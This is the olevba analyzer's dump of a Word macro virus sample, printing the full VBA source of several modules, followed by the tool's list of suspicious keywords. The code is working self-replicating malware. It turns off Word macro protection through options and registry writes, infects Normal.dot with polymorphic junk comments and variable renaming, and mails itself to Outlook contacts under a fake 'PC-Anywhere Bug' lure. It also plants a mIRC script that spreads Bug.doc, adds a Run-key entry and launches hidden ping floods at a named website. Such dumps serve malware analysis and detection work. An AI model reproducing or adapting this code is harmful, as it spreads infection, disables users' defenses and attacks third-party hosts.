olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Pexas-4625593562d02fc155239d866430c53a01ded2e1
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Pexas-4625593562d02fc155239d866430c53a01ded2e1 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Modul2.bas 
in file: Virus.MSWord.Pexas-4625593562d02fc155239d866430c53a01ded2e1 - OLE stream: 'Macros/VBA/Modul2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
On Error Resume Next
zi = Day(Date)
If zi = 38 Then
MsgBox "This Macro Virus are made by Energy 2002 a member of Ready Rangers Liberation Front.", vbInformation, "Pc Anywhere Virus"
Application.Quit (False)
End If
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "Pc Anywhere") <> "Pc Anywhere" Then
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "Pc Anywhere") = "Pc Anywhere"
CommandBars(Chr(84) + Chr(111) + Chr(111) + Chr(108) + Chr(115)).Controls(Chr(77) + Chr(97) + Chr(99) + Chr(114) + Chr(111)).Enabled = (5 - 5)
Options.VirusProtection = (2 Xor 2)
Options.SaveNormalPrompt = (4 Xor 4)
With Options
.AllowFastSave = True
.BackgroundSave = True
.CreateBackup = False
.SavePropertiesPrompt = False
.ConfirmConversions = False
.UpdateLinksAtOpen = True
.SendMailAttach = True
End With
Randomize
nr = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
Set myTemplate = NormalTemplate
myTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, myTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
myTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, "Sub Document_Close"
For i = 2 To nr
xxx = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(i, 1)
poly = Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32))
strn = xxx + " '" + poly
myTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines i, strn
Next i
Documents.Open FileName:=NormalTemplate.FullName, ConfirmConversions:=False, ReadOnly:=False, AddToRecentFiles:=False, PasswordDocument:="", PasswordTemplate:="", Revert:=False, Format:=wdOpenFormatAuto
ActiveDocument.Save
ActiveDocument.Close
Dim DOutlook, DMapiName, BreakUmOffAS
Set DOutlook = CreateObject("Outlook.Application")
Set DMapiName = DOutlook.GetNameSpace("MAPI")
If DOutlook = "Outlook" Then
DMapiName.Logon "profile", "password"
For i = 1 To DMapiName.AddressLists.Count
Set ABook = DMapiName.AddressLists(i)
x = 1
Set BreakUmOffAS = DOutlook.CreateItem(0)
For n = 1 To ABook.AddressEntries.Count
Pee = ABook.AddressEntries(x)
BreakUmOffAS.Recipients.Add Pee
x = x + 1
If x > 20 Then n = ABook.AddressEntries.Count
Next n
BreakUmOffAS.Subject = "PC-Anywhere Bug: " & Application.UserName
BreakUmOffAS.Body = "the Newest PC-Anywhere has a fatal Bug in it. Visit the attachment Document, and see self !!"
BreakUmOffAS.Attachments.Add ActiveDocument.FullName
BreakUmOffAS.Send
Pee = ""
Next i
DMapiName.Logoff
End If
nume = ActiveDocument.FullName
myDir = "mIRC"
For i = 1 To 2
ActiveDocument.SaveAs FileName:="C:\" + myDir + "\" + "Bug.doc"
ActiveDocument.SaveAs FileName:=nume
Call Kill("C:\" + myDir + "\script.ini")
Open "C:\" + myDir + "\script.ini" For Output As #1
Print #1, "[script]"
Print #1, "n0=on 1:JOIN:#:{"
Print #1, "n1=/query $nick Bug.doc ,PC-Anywhere Bug !"
Print #1, "n2=/send $nick Bug.doc"
Print #1, "n3=}"
Print #1, "n4=on 1:PART:#:{"
Print #1, "n5=/query $nick Bug.doc ,PC-Anywhere Bug !"
Print #1, "n6=/send $nick Bug.doc"
Print #1, "n7=}"
myDir = "Program Files"
Close #1
Next i
End If
For Each aVar In ActiveDocument.Variables
If aVar.Name = "Pc Anywhere" Then num = aVar.Index
Next aVar
If (num = 0) And (NormalTemplate.FullName <> ActiveDocument.FullName) Then
ActiveDocument.Variables.Add Name:="Pc Anywhere"
ActiveDocument.Variables("Pc Anywhere").Value = 1
Set myTemplate = NormalTemplate
nr = myTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines
ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines 1, ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
For i = 2 To nr
s = myTemplate.VBProject.VBComponents(1).CodeModule.Lines(i, 1)
ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines i, s
Next i
ActiveDocument.Save
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO Modul1.bas 
in file: Virus.MSWord.Pexas-4625593562d02fc155239d866430c53a01ded2e1 - OLE stream: 'Macros/VBA/Modul1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Document_Open()
On Error Resume Next 'vlE
If ThisDocument.FullName <> Templates(1).FullName Then 'QTJ
YTMMp = 8 '�9O
ReDim YRMMp(1 To YTMMp) As String 'pf%
YRMMp(1) = "YTMMp": YRMMp(2) = "CNEMp": YRMMp(3) = "YRMMp": YRMMp(4) = "VILMp" 'v\�
YRMMp(5) = "VHHMp": YRMMp(6) = "UXAMp": YRMMp(7) = "MGBMp": YRMMp(8) = "VYEMp" '’€–
Set MGBMp = ActiveDocument.VBProject.VBComponents(1).CodeModule 'SgC
For UXAMp = 1 To YTMMp ';E:
Randomize 'Vb}
VHHMp = Chr(Int((25 * Rnd) + 65)) + Chr(Int((25 * Rnd) + 65)) + Chr(Int((25 * Rnd) + 65)) + "Mp" 'ua€
For CNEMp = 2 To MGBMp.CountOfLines 'pJ�
VYEMp = MGBMp.Lines(CNEMp, 1) '%+‰
If InStr(1, VYEMp, YRMMp(UXAMp), vbTextCompare) Then '3*�
VYEMp = Replace(VYEMp, YRMMp(UXAMp), VHHMp, 1, -1, vbTextCompare) 'w~‘
MGBMp.ReplaceLine CNEMp, VYEMp 'W,
End If ']BB
Next CNEMp '{cS
Next UXAMp '>”�
For UXAMp = 2 To MGBMp.CountOfLines 'ˆh’
VYEMp = MGBMp.Lines(UXAMp, 1) 'n•q
If Len(VYEMp) <= 100 Then 'sz’
VYEMp = VYEMp + "'" + Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32))
MGBMp.ReplaceLine UXAMp, VYEMp '7.…
End If '†=•
Next UXAMp 'YdY
End If 'Q%]
End Sub '’B{
-------------------------------------------------------------------------------
VBA MACRO Blood.bas 
in file: Virus.MSWord.Pexas-4625593562d02fc155239d866430c53a01ded2e1 - OLE stream: 'Macros/VBA/Blood'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error Resume Next
With Options
    .ConfirmConversions = False
    .VirusProtection = False
    .SaveNormalPrompt = False
End With

System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "Level") = 1&

WordBasic.DisableAutoMacros 0
Set Nor = NormalTemplate.VBProject.VBComponents
Set Doc = ActiveDocument.VBProject.VBComponents
win = Environ("windir")
DropFile = win & "\blood.sys"
If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\Blood\", "InfectDot") <> "OK" Then
    Doc("Blood").Export DropFile
    Nor.import DropFile
    System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\Blood\", "InfectDot") = "OK"
End If
If Doc.Item("Blood").Name <> "Blood" Then
    Nor("Blood").Export DropFile
    Doc.import DropFile
    ActiveDocument.Save
End If

If Day(Now) = 15 Then
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RegisteredOwner") = "BloodMan"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RegisteredOrganization") = "PetiK Corporation"
End If

End Sub

Sub HelpAbout()
With Application.Assistant
    .Visible = True
End With
With Assistant.NewBalloon
    .Text = "W97M.Blood.A coded by PetiK (c)2001"
    .Heading = "W97M.Blood"
    .Animation = msoAnimationGetAttentionMajor
    .Button = msoButtonSetOK
    .Show
End With
End Sub

Sub ViewVBCode()
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\", "Blood1") = "rundll32 mouse,disable"
MsgBox "Your computer is dead." + vbCr + "Don't stop your machine", vbCritical, "W97M.Blood"
ShowVisualBasicEditor = True
End Sub

Sub AutoClose()
MsgBox "PetiK vous souhaite une trטs bonne journיe", vbExclamation, "W97M.Blood"
Call PetiK
Call Attak
End Sub

Sub PetiK()
On Error Resume Next
win = Environ("windir")
FileSystem.MkDir win & "\Blood"
Open win & "\Blood\TitleBlood.txt" For Output As #1
Print #1, "For the new Macro Virus W97M.Blood by PetiK"
Print #1, ""
Print #1, "Hi " & Application.UserName & ","
Print #1, "How do you do ?"
Print #1, "Your computer is infected by Blood"
Print #1, "It's not a dangerous macro."
Print #1, "         Bye.    PetiK"
Close #1
FileSystem.SetAttr win & "\Blood\TitleBlood.txt", vbReadOnly
End Sub

Sub Attak()
Shell "ping -l 5000 -t www.front-national.fr", vbHide
Shell "ping -l 5000 -t front-national.fr", vbHide
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|.Variables          |May use Word Document Variables to store and |
|          |                    |hide data                                    |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

